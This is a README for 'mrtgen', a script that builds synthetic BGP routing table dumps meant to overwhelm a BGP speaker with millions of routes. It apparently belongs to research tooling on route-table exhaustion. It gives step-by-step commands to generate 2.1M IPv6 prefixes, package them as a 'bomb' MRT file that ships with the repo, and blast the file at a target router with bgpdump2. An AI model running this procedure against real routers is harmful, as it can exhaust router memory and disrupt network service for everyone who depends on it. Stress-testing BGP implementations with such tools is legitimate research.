# mrtgen

This Python script writes synthetic MRT RIB dumps (in [TABLE_DUMP_V2](https://datatracker.ietf.org/doc/html/rfc6396#section-4.3) format), in order to (hopefully) overwhelm a BGP speaker with too many routes.

Each line of the stdin must be an IPv4 or IPv6 prefix.

Some properties of the MRT file can be set using command-line options (see `mrtgen.py --help`):
```
$ ./mrtgen.py --help
usage: mrtgen.py [-h] [--me ME] [--id ID] [--ip IP] [--asn ASN] [--aspath ASPATH [ASPATH ...]] [--nh4 NH4] [--nh6 NH6] TARGET

Generate MRT RIB files (TABLE_DUMP_V2 format)

positional arguments:
  TARGET                target file

optional arguments:
  -h, --help            show this help message and exit
  --me ME               my BGP identifier (default: 192.168.99.3)
  --id ID               peer BGP identifier (default: 192.168.99.1)
  --ip IP               peer IP address (default: 192.168.99.1)
  --asn ASN             peer ASN (default: 65001)
  --aspath ASPATH       AS_PATH attribute
                        specify multiple times to alternate announcements
  --nh4 NH4             Next-Hop IPv4 address (default: 192.168.99.1)
  --nh6 NH6             Next-Hop IPv6 address (default: fc00::1)
  --comm                add a unique COMMUNITY attribute to each announcement (default: False)
  --aggr                add a unique AGGREGATOR attribute to each announcement (default: False)
```

An example is provided in `bomb.mrt.bz2`, an artificial dump of 2.1M IPv6 routes to subnets of `2000::/28` (all possible longer prefixes, up to `/48`).

# Requirements

 * [ryu](https://github.com/faucetsdn/ryu): a component-based software defined networking framework, eg:
 ```
 # optional: use virtualenv instead (https://virtualenv.pypa.io/)
 $ sudo -H pip3 install --upgrade ryu
 ```
 * optional: [splitter](https://github.com/kirin-attack/splitter) - IPv6 prefix splitter, eg:
 ```
 $ git clone git@github.com:kirin-attack/splitter.git
 $ cd splitter
 $ go build
 $ ./splitter 2001:db8::/47
2001:db8::/48
2001:db8:1::/48
 ```
 
 * optional: [rtbrick/bgpdump2](https://github.com/rtbrick/bgpdump2) - bgpdump2 with a BGP blaster mode
 ```
 # recommended to use local version due to compile errors
 $ git clone git@github.com:kirin-attack/bgpdump2.git
 $ cd bgpdump2
 $ ./configure --prefix=$HOME/local
 $ make
 $ sudo make install
 ```

# Usage

1. Prepare input - a list of IPv6 prefixes, for example using [splitter](https://github.com/kirin-attack/splitter):
```
$ ../splitter/splitter 2000::/28 > input.txt
$ wc -l input.txt 
2097150 input.txt
```

2. Convert the input into an MRT file, for example:
```
$ cat input.txt | ./mrtgen.py bomb.mrt.bz2
$ ls -lh bomb.mrt.bz2 
-rw-rw-r-- 1 pjf pjf 7.5M Oct 14 13:44 bomb.mrt.bz2
```
 * note this file is already available pre-generated in this repo, for you convenience

3. Blast the file at a BGP speaker:
```
$ bgpdump2 -6 -v -B fc00::2 -S fc00::3 -a 65001 -- ./bomb.mrt.bz2
```
* `-6` means IPv6 routes (required)
* `-v` means verbose operation (optional)
* `-B fc00::2` sets the remote BGP speaker IP address
* `-S fc00::3` overwrites the NEXT_HOP IP address in exported routes
* `-a 65001` sets our (local) AS number
